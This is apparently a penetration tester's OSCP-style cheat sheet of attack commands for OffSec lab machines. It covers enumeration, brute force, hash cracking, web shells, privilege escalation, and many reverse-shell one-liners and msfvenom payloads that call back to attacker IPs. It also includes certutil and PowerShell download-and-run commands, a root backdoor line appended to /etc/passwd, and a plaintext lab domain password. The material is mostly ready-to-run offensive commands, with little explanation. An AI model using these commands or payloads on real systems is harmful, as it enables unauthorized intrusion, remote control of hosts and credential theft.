ENUMERATION

Port Scan
nmap -sC -sV -p- -vv -oA full 192.168.xxx.xxx
nmap -v -sS -A -T4 192.168.xxx.xxx (no ping)
nmap -sV -sC -Pn  192.168.xxx.xxx
nmap --script vuln 192.168.xxx.xxx

Web Enum
nikto -h 192.168.xxx.xxx
nikto -h 192.168.xxx.xxx -C all
gobuster dir -u http://192.168.xxx.xxx/ -w /usr/share/dirb/wordlists/common.txt -k -x .txt,.php --threads 50
gobuster dir -u http://192.168.98.106 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,sh,cgi,js,css,py -t 40
python3 /opt/dirsearch/dirsearch.py -u http://192.168.xxx.xxx -e php,html -x 400,401,403
python3 /opt/dirsearch/dirsearch.py -u http://192.168.61.xxx.xxx -x 400,500 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e asp,php,html,aspx
feroxbuster -u http://192.168.xxx.xxx
uniscan -qweds -u 192.168.xxx.xxx
curl http://website/ -s | html2text | tail
curl http://192.168.xxx.xxx:8080/api/user/ | jq '.[] | .login'
curl -T '/root/oscp/inter/hutch/sh.asp' 'http://192.168.xxx.xxx/' -u username:password
curl -d “” http://192.168.62.99:33333/list-active-nodes

LDAP EMUM
nmap -n -sV --script "ldap* and not brute" 192.168.xxx.xxx
ldapsearch -x -h 192.168.xxx.xxx -D '' -w '' -b "DC=hutch,DC=offsec" | grep sAMAccountName:
ldapsearch -x -h 192.168.xxx.xxx-D '' -w '' -b "DC=hutch,DC=offsec" | grep description
ldapsearch -x -h 192.168.xxx.xxx -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd 

SMB Enum
smbclient -L \\\\192.168.xxx.xxx (List shares)
smbclient \\\\192.168.xxx.xxx\\shenzi (Connect to share)
smbclient -U '' \\\\192.168.xxx.xxx\Scripts$ 
smbmap -u null -p null -H 192.168.xxx.xxx -s Scripting$ -R
enum4linux -A 192.168.xxx.xxx
python3 /opt/impacket/examples/smbserver.py Share /root/oscp/hard/meathead

SMTP Enum
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/cirt-default-usernames.txt -t 192.168.106.137
smtp-user-enum -M VRFY -U emails.txt -t 192.168.106.137

Remote Command Execution
echo "<?php echo system($_GET['x']); ?>" >> test.php | http://192.168.xxx.xxx/shell.php?cmd=dir
curl -G 'http://localhost/?' --data-urlencode 'cmd /c C:\\users\\ariah\\desktop\\payload.exe'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.87",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

Rsync
rsync -av 192.168.244.126::fox . (list)
rsync -avp fox/ fox@192.168.101.126::fox/ (send directory)

SSH 
ssh-keygen -f ~/.ssh/authorized_keys -t ed25519
ssh -i ~/.ssh/authorized_keys fox@192.168.101.126
ssh -i id_rsa cmeeks@192.168.61.117
ssh user@192.168.xxx.xxx -p 43022

Reverse Shell
1. Netcat listener
rlwrap nc -lvp 21
2.Msfvenom
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.xxx.xxx LPORT=242 -f exe -o reverse.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.xxx.xxx LPORT=445 -f msi > notavirus.msi
3. Nishang Powershell (edit end of script)
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcpOneLine.ps1
#$client = New-Object System.Net.Sockets.TCPClient('192.168.xxx.xxx,1234;$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
cp Invoke-PowerShellTcpOneLine.ps1 rev.ps1
4.Python
python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.xxx.xxx",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
5. Php
https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/php_reverse_shell.php (Windows)
6. Elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.xxx.xxx LPORT=22 -f elf > shell
msfvenom -p linux/x64/shell_reverse_tcp -f elf-so -o utils.so LHOST=192.168.xxx.xxx LPORT=6379
7.Win-RM
evil-winrm -i 192.168.xxx.xxx -u 'Administrator' -p 'password'
8.
curl "http://192.168.210.147:30455/cmd.php?cmd=wget http://192.168.49.210:443/rev.txt -O /srv/http/rev.php"
9. Python
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.219 LPORT=4411  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python
10.
curl http://192.168.181.106/api/users | jq '.[]' -r > users.txt (JSON)
11. exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.105 LPORT=450 -f exe > shell.exe
12.Asp
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.67 LPORT=445 -f aspx > sh.aspx
13. DLL
msfvenom -p windows/shell_reverse_tcp -f dll -o jacko.dll LHOST=192.168.xxx.xxx LPORT=8082

File Transfer
scp -i .ssh/id_rsa scp_wrapper.sh max@192.168.xxx.xxx:/home/max/

Ident
ident-user-enum 192.168.105.60 10000

Memcache
echo "version" | nc -vn -w 1 192.168.63.59 11211   
VERSION 1.4.33
echo "stats" | nc -vn -w 1 192.168.63.59 11211   

Brute Force
hydra -l admin -V -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.xxx.xxx http-get / -t 15
hydra -f -L users.txt -P password.txt ssh://192.168.xxx.xxx:8080
medusa -U users.txt -P password.txt -h 192.168.xxx.xxx -n 8080 -M ssh -f -v 6
crackmapexec ssh 192.168.218.39 -u patrick -p /usr/share/wordlists/rockyou.txt
hydra -s 143 -L /root/inter/postfish/users.txt -P /root/oscp/inter/postfish/cewl.txt -t 192.168.106.137 imap

RAR File
rar2john MSSQL_BAK.rar 
unrar e backup.rar

SQL Injection
sqlmap -r post.txt --dbms mysql --os-shell

MSSQL
sqsh -S 192.168.112.70:1435 -U sa -P password

PSQL
psql -h 192.168.xxx.xxx -U postgres -p 5437
postgres-# \l
                                  List of databases
   Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
-----------+----------+----------+-------------+-------------+-----------------------
 postgres  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
           |          |          |             |             | postgres=CTc/postgres
 template1 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
           |          |          |             |             | postgres=CTc/postgres
(3 rows)
postgres=# select current_database();
postgres=# create table oscp (input TEXT);
postgres=# select input from oscp;

Upgrade shell
python -c 'import pty; pty.spawn("/bin/sh")'

Check System Info
lsb_release -a
hostnamectl

Password  cracking
hashcat -m 1600 -a 0 password.hash /usr/share/wordlists/rockyou.txt (MD5)
echo '$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0' >> password.hash
hashcat --force -m 0 -a 0 -o found1.txt --remove qj.hash /usr/share/wordlists/rockyou.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt qj.hash 
pdfcrack -f Infrastructure.pdf -w /usr/share/wordlists/rockyou.txt
hashcat --force -m 0 -a 0 -o found1.txt --remove qj.hash /usr/share/wordlists/rockyou.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt qj.hash 
hashcat -m 13000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt 
$rar5$16$53b1acf5cd3d02dafdf50f1cb79e46e5$15$a8761ee8f467302d9ee19284f60713dd$8$514688ceb07cab7b:letmeinplease

Upload Payload
1.Windows
certutil.exe -f -urlcache -split http://192.168.xxx.xxx/Juicy.Potato.x86.exe
cadaver http://mwebsite/webdav/
curl "http://192.168.87.127:45332/cmd.php?cmd=certutil+-f+-urlcache+http://192.168.49.87:45332/bd.exe+bd.exe"
powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.49.160/shell.exe', 'C:\Program Files (x86)\Foxit Software\Foxit.exe')"
mshta http://192.168.49.140/winPEASany.exe

RFI
curl http://192.168.xxx.xxx/cmd.php?cmd=whoami+/all
curl http://website/webdav/php-reverse-shell.php -u administrant:sleepless
python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.100",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

Proof
type C:\Users\"username"\Desktop\local.txt

PRIV ESC

Local HTTP Server
python3 -m http.server 80
python2 -m SimpleHTTPServer 80

SMB Server
smbserver.py -smb2support Share /root/oscp/inter/jacko
python3 /opt/impacket/examples/smbserver.py Share /root/oscp/hard/meathead
copy audit.txt.txt \\192.168.49.140\Share\
\\192.168.49.140\Share\nc.exe -e cmd.exe 192.168.49.140 139


Password Salt
openssl passwd -1 -salt password password 
echo 'owned:$1$password$Da2mWXlxe6J7jtww12SNG/:0:0:owned:/root:/bin/bash' >> /etc/passwd
su owned
mkpasswd -m sha-512 hacker
$6$9mUPLU5z$nuRrwMJmyrzf0HjowtcFYWPpbFj9q53c1yVL6zEkJC6VkyWnY9WAOxt94iNf9kyhcSgJjOX1lnS59I/gdoLo7/
openssl passwd -1 -salt password password 
$1$password$Da2mWXlxe6J7jtww12SNG/
echo 'owned:$1$password$Da2mWXlxe6J7jtww12SNG/:0:0:owned:/root:/bin/bash' >> /etc/passwd
su owned

Reverse Shell
1.Psexec
psexec.py hutch.offsec/administrator:"password"@192.168.xxx.xxx
2. Python
#!/usr/bin/env python
import os
import sys
try:
        os.system('nc -nv 192.168.49.73 22 -e /bin/sh')
except:
        print 'ERROR...'
sys.exit(0)

Linux
1.SUID
find / -perm -u=s -type f 2>/dev/null

Windows
1. JAWS 
C:\temp> powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1
2.JUICY POTATO
get CLSID here:http://ohpe.it/juicy-potato/CLSID/
C:\wamp\www>.\Juicy.Potato.x86.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}  -p c:\windows\system32\cmd.exe -a "/c c:\wamp\www\nc.exe -e cmd.exe 192.168.xxx.xxx 21" -l 31337
3. Rogue Potato
RoguePotato.exe -r 192.168.49.218 -e "/c c:\wamp\www\nc.exe 192.168.49.218 21 -e cmd.exe" -l 31337
4.Print Spoofer
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
curl http://192.168.62.169/cmd.php?cmd=powershell%20iwr%20http://192.168.49.62/PrintSpoofer64.exe%20-OutFile%20C:%5CWindows%5Ctasks%5CPrintSpoofer64.exe
curl http://192.168.62.169/cmd.php?cmd=C:%5CWindows%5Ctasks%5CPrintSpoofer64.exe%20-c%20%22cmd%20/c%20powershell%20-c%20C:/Windows/Tasks/rev.ps1%22
PrintSpoofer.exe -i -c cmd
5. Seatbelt
C:\Users\nathan>Seatbelt.exe all
6.WindowsEnum
wget https://raw.githubusercontent.com/absolomb/WindowsEnum/master/WindowsEnum.ps1
powershell -nologo -executionpolicy bypass -file WindowsEnum.ps1 extended
7. Unquoted service path
wmic service get name, displayname, pathname, startmode |findstr /i "auto"| findstr /i /v "c:\windows\\" | findstr /i /v """
8. Search registry for passwords
reg query HKLM /f password /t REG_SZ /s
reg query HKLM /f pass /t REG_SZ /s
9. Windows Privesc
windows-privesc-check2.exe --audit -a -o audit.txt

Proof
type c:\users\administrator\desktop\proof.txt
